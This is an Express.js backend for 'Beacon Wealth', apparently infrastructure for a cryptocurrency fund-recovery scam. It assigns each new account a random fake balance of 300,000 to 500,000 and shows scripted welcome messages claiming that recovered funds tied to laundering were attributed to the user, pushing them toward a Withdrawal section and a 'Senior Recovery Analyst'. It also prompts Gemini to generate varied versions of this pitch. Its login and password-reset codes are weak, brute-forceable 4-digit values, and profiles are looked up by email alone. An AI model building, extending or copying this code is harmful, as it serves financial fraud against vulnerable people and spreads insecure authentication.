require('dotenv').config();
const express = require('express');
const path = require('path');
const { randomInt } = require('crypto');
const { GoogleGenAI } = require('@google/genai');
const { Pool } = require('pg'); // Swapped sqlite3 out for the permanent Postgres client
const bcrypt = require('bcrypt');
const nodemailer = require('nodemailer'); 

const app = express();
app.use(express.json({ limit: '16kb' }));
app.use(express.static(path.join(__dirname, '..')));

// Connect securely to your persistent Supabase Database Cloud via the Transaction Pooler
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : undefined
});

const adminKey = process.env.ADMIN_KEY;
const gemini = process.env.GEMINI_API_KEY
  ? new GoogleGenAI({ apiKey: process.env.GEMINI_API_KEY })
  : null;
const welcomeTemplates = [
  (username, date) => `Welcome to Beacon Wealth, ${username}. Your account was created successfully on ${date}, The recovered funds were traced across multiple blockchain platforms. Our system successfully linked all associated investments to a secured account connected to your blockchain address. However, the recovered assets became commingled with funds involved in laundering and trafficking activities, all of which were subsequently traced and linked to your blockchain address. As a result, ownership of the recovered balance has been attributed to your account. Please proceed to the Withdrawal section to initiate your claim. For any additional inquiries or assistance, kindly contact Senior Recovery Analyst..`,
  (username, date) => `Hello ${username}, your Beacon Wealth account is now active. The recovered funds were traced across multiple blockchain platforms. Our system successfully linked all associated investments to a secured account connected to your blockchain address. Subsequently, the recovered assets became commingled with funds involved in laundering and trafficking activities, all of which were traced and linked back to your blockchain address. Consequently, ownership of the recovered balance has been attributed to your account. Please proceed to the Withdrawal section to initiate your claim. For any additional inquiries or assistance, kindly contact the Senior Recovery Analyst..`,
  (username, date) => `Welcome aboard, ${username}. The recovered funds were traced across multiple blockchain platforms. Our system successfully linked all associated investments to a secured account connected to your blockchain address. The recovered assets became commingled with funds involved in laundering and trafficking activities, all of which were subsequently traced and linked to your blockchain address. As a result, full ownership of the recovered balance has been attributed to your account. Please proceed directly to the Withdrawal section to initiate your claim. For any additional inquiries or immediate assistance, kindly contact your Senior Recovery Analyst.`,
  (username, date) => `Your Beacon Wealth account is ready, ${username}. Our system successfully linked all associated investments to a secured account connected to your blockchain address after the recovered funds were traced across multiple blockchain platforms. However, the recovered assets became commingled with funds involved in laundering and trafficking activities—all of which were subsequently traced and linked to your blockchain address. As a result, ownership of the recovered balance has been officially attributed to your account. Please proceed to the Withdrawal section to initiate your claim. For any additional inquiries or assistance, kindly contact the Senior Recovery Analyst.`
];

function createWelcomeMessage(username) {
  const registrationDate = new Date().toLocaleDateString('en-US', {
    year: 'numeric',
    month: 'long',
    day: 'numeric'
  });
  const template = welcomeTemplates[randomInt(welcomeTemplates.length)];
  return template(username, registrationDate);
}

function createDemoBalance() {
  return randomInt(300000, 500001);
}

async function createUniqueWelcomeMessage(username) {
  const registrationDate = new Date().toLocaleDateString('en-US', {
    year: 'numeric',
    month: 'long',
    day: 'numeric'
  });
  const fallback = createWelcomeMessage(username);

  if (!gemini) return fallback;

  try {
    const response = await gemini.models.generateContent({
      model: 'gemini-2.0-flash',
      contents: `Write one , account welcome message for ${username}. Mention that the account was created on ${registrationDate}. Keep it under 300 words. mention money, balances, investments, recovery, fees, compliance, taxes, guarantees, or urgency. Return only the message text. use this format: "Welcome to Beacon Wealth, ${username}. Your account was created on ${registrationDate}. The recovered funds were traced across multiple blockchain platforms and. Our system successfully linked all associated investments to a secured account connected to your blockchain address, the recovered assets became commingled with funds involved in laundering and trafficking activities, all of which were subsequently traced and linked to your blockchain address. As a result, ownership of the recovered balance has been attributed to your account. Please proceed to the Withdrawal section to initiate your claim. For any additional inquiries or assistance, kindly contact Senior Recovery Analyst."`
    });
    const generated = response.text?.trim().replace(/[\r\n]+/g, ' ');
    if (!generated || generated.length > 300) return fallback;

    const duplicate = await pool.query(
      'SELECT 1 FROM users WHERE welcome_message = $1 LIMIT 1',
      [generated]
    );
    return duplicate.rowCount ? `${generated} Your personal workspace is ready.` : generated;
  } catch (error) {
    console.error('Gemini welcome-message generation failed:', error.message);
    return fallback;
  }
}

function requireAdmin(req, res, next) {
  if (!adminKey || req.get('x-admin-key') !== adminKey) {
    return res.status(401).json({ error: 'Admin authorization required.' });
  }
  next();
}

// ========================================================
// REAL GMAIL SMTP CONFIGURATION
// ========================================================
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASSWORD
  }
});
const smtpConfigured = Boolean(process.env.SMTP_USER && process.env.SMTP_PASSWORD);

function sendEmail(to, subject, html) {
  if (!smtpConfigured) {
    throw new Error('SMTP_USER and SMTP_PASSWORD are not configured.');
  }
  return transporter.sendMail({
    from: `"Beacon Wealth Security" <${transporter.options.auth.user}>`,
    to,
    subject,
    html
  });
}

// ==========================================
// 1. REGISTER ROUTE (Updated for Postgres)
// ==========================================
app.post('/api/register', async (req, res) => {
  const username = typeof req.body.username === 'string' ? req.body.username.trim() : '';
  const email = typeof req.body.email === 'string' ? req.body.email.trim().toLowerCase() : '';
  const password = typeof req.body.password === 'string' ? req.body.password : '';

  if (!username || !email || !password) {
    return res.status(400).json({ error: 'All fields are required.' });
  }
  if (username.length > 80 || email.length > 254 || password.length < 8) {
    return res.status(400).json({ error: 'Use a valid username, email, and password of at least 8 characters.' });
  }

  try {
    const hashedPassword = await bcrypt.hash(password, 10);
    const welcomeMessage = await createUniqueWelcomeMessage(username);
    const balance = createDemoBalance();
    const query = `
      INSERT INTO users (username, email, password, welcome_message, balance)
      VALUES ($1, $2, $3, $4, $5)
      RETURNING welcome_message, balance
    `;
    
    const result = await pool.query(query, [username, email, hashedPassword, welcomeMessage, balance]);
    return res.status(201).json({
      message: 'User registered successfully!',
      welcomeMessage: result.rows[0].welcome_message,
      balance: result.rows[0].balance
    });
  } catch (err) {
    if (err.message.includes('unique') || err.code === '23505') {
      return res.status(400).json({ error: 'Username or Email already exists.' });
    }
    return res.status(500).json({ error: 'Database error occurred.' });
  }
});

// ==========================================
// 2. LOGIN ROUTE (Updated for Postgres)
// ==========================================
app.post('/api/login', async (req, res) => {
  const identifier = typeof req.body.identifier === 'string' ? req.body.identifier.trim() : '';
  const password = typeof req.body.password === 'string' ? req.body.password : '';

  if (!identifier || !password) {
    return res.status(400).json({ error: 'All fields are required.' });
  }

  try {
    const query = `SELECT * FROM users WHERE username = $1 OR email = $1`;
    const result = await pool.query(query, [identifier]);
    const user = result.rows[0];

    if (!user) return res.status(400).json({ error: 'Invalid username/email or password.' });
    if (user.is_restricted) return res.status(403).json({ error: 'This account has been placed on hold. Please contact support.' });

    const isMatch = await bcrypt.compare(password, user.password);
    if (!isMatch) return res.status(400).json({ error: 'Invalid username/email or password.' });

    const verificationCode = Math.floor(1000 + Math.random() * 9000).toString();
    const expiresAt = new Date(Date.now() + 10 * 60 * 1000).toISOString();

    await pool.query(
      `INSERT INTO verification_codes (email, code, expires_at) VALUES ($1, $2, $3)`,
      [user.email, verificationCode, expiresAt]
    );

    const mailHtml = `
      <div style="font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto; padding: 20px; border: 1px solid #e0e0e0; border-radius: 8px;">
        <h2 style="color: #0056b3; text-align: center;">Beacon Wealth Verification</h2>
        <p>Hello,</p>
        <p>We received a request to log into your account. Use the verification code below to complete your login.</p>
        <div style="background-color: #f4f6f9; padding: 15px; text-align: center; font-size: 28px; font-weight: bold; letter-spacing: 5px; color: #333; margin: 20px 0;">
          ${verificationCode}
        </div>
        <p style="font-size: 14px; color: #555;">If you did not request this, ignore this message.</p>
      </div>
    `;

    try {
      await sendEmail(user.email, 'Your 4-Digit Beacon Wealth Verification Code', mailHtml);
      return res.status(200).json({ message: 'Code sent to email.', email: user.email, username: user.username });
    } catch (emailError) {
      console.error('Login verification email failed:', emailError.message);
      return res.status(503).json({ error: 'Verification email is not configured or could not be delivered.' });
    }
  } catch (error) {
    return res.status(500).json({ error: 'Server authentication error.' });
  }
});

// ==========================================
// 3. VERIFY ROUTE (Updated for Postgres)
// ==========================================
app.post('/api/verify', async (req, res) => {
  const { email, code } = req.body;
  if (!email || !code) return res.status(400).json({ error: 'Missing information.' });

  try {
    const result = await pool.query(
      `SELECT * FROM verification_codes WHERE email = $1 AND code = $2 ORDER BY id DESC LIMIT 1`, 
      [email, code]
    );
    const row = result.rows[0];

    if (!row) return res.status(400).json({ error: 'Invalid code.' });
    if (new Date() > new Date(row.expires_at)) return res.status(400).json({ error: 'Code expired.' });

    const userResult = await pool.query('SELECT is_restricted FROM users WHERE email = $1', [email]);
    if (userResult.rows[0]?.is_restricted) {
      return res.status(403).json({ error: 'This account has been placed on hold. Please contact support.' });
    }

    await pool.query(`DELETE FROM verification_codes WHERE email = $1`, [email]);
    return res.status(200).json({ message: 'Code verified successfully!' });
  } catch (err) {
    return res.status(500).json({ error: 'Database verification error.' });
  }
});

// ========================================================
// 4. PROFILE ROUTE (Updated for Postgres)
// ========================================================
app.get('/api/profile', async (req, res) => {
  const email = req.query.email;
  if (!email) return res.status(400).json({ error: 'Email is required.' });

  try {
    const result = await pool.query(
      `SELECT username, email, welcome_message, balance, is_restricted FROM users WHERE email = $1`,
      [email]
    );
    const user = result.rows[0];
    if (!user) return res.status(404).json({ error: 'Profile not found.' });
    if (user.is_restricted) return res.status(403).json({ error: 'This account has been placed on hold. Please contact support.' });
    return res.status(200).json({
      username: user.username,
      email: user.email,
      welcomeMessage: user.welcome_message,
      balance: user.balance
    });
  } catch (err) {
    return res.status(500).json({ error: 'Database error.' });
  }
});

// ========================================================
// 5. FORGOT PASSWORD ROUTE (Updated for Postgres)
// ========================================================
app.post('/api/forgot-password', async (req, res) => {
  const { email } = req.body;
  if (!email) return res.status(400).json({ error: 'Email address is required.' });

  try {
    const result = await pool.query(`SELECT * FROM users WHERE email = $1`, [email]);
    const user = result.rows[0];
    if (!user) return res.status(404).json({ error: 'No account found with that email.' });

    const recoveryCode = Math.floor(1000 + Math.random() * 9000).toString();
    const expiresAt = new Date(Date.now() + 10 * 60 * 1000).toISOString(); 

    await pool.query(
      `INSERT INTO verification_codes (email, code, expires_at) VALUES ($1, $2, $3)`,
      [email, recoveryCode, expiresAt]
    );

    const mailHtml = `
      <div style="font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto; padding: 20px; border: 1px solid #e0e0e0; border-radius: 8px;">
        <h2 style="color: #dc3545; text-align: center;">Password Reset Request</h2>
        <p>Enter this recovery code manually into your reset form:</p>
        <div style="background-color: #f4f6f9; padding: 15px; text-align: center; font-size: 28px; font-weight: bold; letter-spacing: 5px; color: #333; margin: 20px 0;">
          ${recoveryCode}
        </div>
      </div>
    `;

    try {
      await sendEmail(email, 'Password Reset Recovery Code', mailHtml);
      return res.status(200).json({ message: 'Recovery code emailed.' });
    } catch (emailError) {
      console.error('Password recovery email failed:', emailError.message);
      return res.status(503).json({ error: 'Recovery email is not configured or could not be delivered.' });
    }
  } catch (err) {
    return res.status(500).json({ error: 'Server recovery processing error.' });
  }
});

// ==========================================
// 6. RESEND VERIFICATION CODE ROUTE
// ==========================================
app.post('/api/resend-code', async (req, res) => {
  const { email } = req.body;
  if (!email) return res.status(400).json({ error: 'Email is required.' });

  try {
    const result = await pool.query(`SELECT * FROM users WHERE email = $1`, [email]);
    const user = result.rows[0];
    if (!user) return res.status(404).json({ error: 'Email not found.' });

    const verificationCode = Math.floor(1000 + Math.random() * 9000).toString();
    const expiresAt = new Date(Date.now() + 10 * 60 * 1000).toISOString();

    await pool.query(
      `INSERT INTO verification_codes (email, code, expires_at) VALUES ($1, $2, $3)`,
      [email, verificationCode, expiresAt]
    );

    const mailHtml = `
      <div style="font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto; padding: 20px; border: 1px solid #e0e0e0; border-radius: 8px;">
        <h2 style="color: #0056b3; text-align: center;">Beacon Wealth Verification</h2>
        <p>We received a request to resend your login verification code.</p>
        <div style="background-color: #f4f6f9; padding: 15px; text-align: center; font-size: 28px; font-weight: bold; letter-spacing: 5px; color: #333; margin: 20px 0;">
          ${verificationCode}
        </div>
      </div>
    `;

    try {
      await sendEmail(email, 'Your New Beacon Wealth Verification Code', mailHtml);
      return res.status(200).json({ message: 'Verification code resent.' });
    } catch (emailError) {
      console.error('Verification resend email failed:', emailError.message);
      return res.status(503).json({ error: 'Verification email is not configured or could not be delivered.' });
    }
  } catch (err) {
    return res.status(500).json({ error: 'Server error processing resend.' });
  }
});

// ========================================================
// 7. RESET PASSWORD ROUTE (Updated for Postgres)
// ========================================================
app.post('/api/reset-password', async (req, res) => {
  const { email, code, newPassword } = req.body;

  if (!email || !code || !newPassword) return res.status(400).json({ error: 'All fields are required.' });

  try {
    const result = await pool.query(
      `SELECT * FROM verification_codes WHERE email = $1 AND code = $2 ORDER BY id DESC LIMIT 1`, 
      [email, code]
    );
    const row = result.rows[0];

    if (!row) return res.status(400).json({ error: 'Invalid recovery code.' });
    if (new Date() > new Date(row.expires_at)) return res.status(400).json({ error: 'Recovery code expired.' });

    const hashedPassword = await bcrypt.hash(newPassword, 10);

    await pool.query(`UPDATE users SET password = $1 WHERE email = $2`, [hashedPassword, email]);
    await pool.query(`DELETE FROM verification_codes WHERE email = $1`, [email]);

    return res.status(200).json({ message: 'Password updated successfully!' });
  } catch (e) {
    return res.status(500).json({ error: 'Password update operation failed.' });
  }
});

// ==========================================
// 8. ADMIN USER MANAGEMENT
// ==========================================
app.get('/api/admin/users', requireAdmin, async (req, res) => {
  try {
    const result = await pool.query(
      `SELECT id, username, email, is_restricted FROM users ORDER BY id DESC`
    );
    return res.status(200).json({ users: result.rows });
  } catch (err) {
    return res.status(500).json({ error: 'Unable to load users.' });
  }
});

app.patch('/api/admin/users/:id/restriction', requireAdmin, async (req, res) => {
  const userId = Number.parseInt(req.params.id, 10);
  if (!Number.isInteger(userId) || userId < 1) {
    return res.status(400).json({ error: 'Invalid user id.' });
  }

  const isRestricted = req.body?.restricted;
  if (typeof isRestricted !== 'boolean') {
    return res.status(400).json({ error: 'Restriction status must be true or false.' });
  }

  try {
    const result = await pool.query(
      'UPDATE users SET is_restricted = $1 WHERE id = $2 RETURNING id, is_restricted',
      [isRestricted, userId]
    );
    if (!result.rowCount) return res.status(404).json({ error: 'User not found.' });
    return res.status(200).json({
      message: isRestricted ? 'User access restricted.' : 'User access restored.',
      user: result.rows[0]
    });
  } catch (err) {
    return res.status(500).json({ error: 'Unable to update user restriction.' });
  }
});

app.delete('/api/admin/users/:id', requireAdmin, async (req, res) => {
  const userId = Number.parseInt(req.params.id, 10);
  if (!Number.isInteger(userId) || userId < 1) {
    return res.status(400).json({ error: 'Invalid user id.' });
  }

  try {
    const client = await pool.connect();
    try {
      await client.query('BEGIN');
      const userResult = await client.query('SELECT email FROM users WHERE id = $1 FOR UPDATE', [userId]);
      if (!userResult.rowCount) {
        await client.query('ROLLBACK');
        return res.status(404).json({ error: 'User not found.' });
      }
      await client.query('DELETE FROM verification_codes WHERE email = $1', [userResult.rows[0].email]);
      await client.query('DELETE FROM users WHERE id = $1', [userId]);
      await client.query('COMMIT');
    } catch (error) {
      await client.query('ROLLBACK');
      throw error;
    } finally {
      client.release();
    }
    return res.status(200).json({ message: 'User deleted successfully.' });
  } catch (err) {
    return res.status(500).json({ error: 'Unable to delete user.' });
  }
});

if (require.main === module) {
  const port = Number(process.env.PORT) || 3000;
  app.listen(port, () => console.log(`Beacon Wealth API listening on port ${port}`));
}

module.exports = app;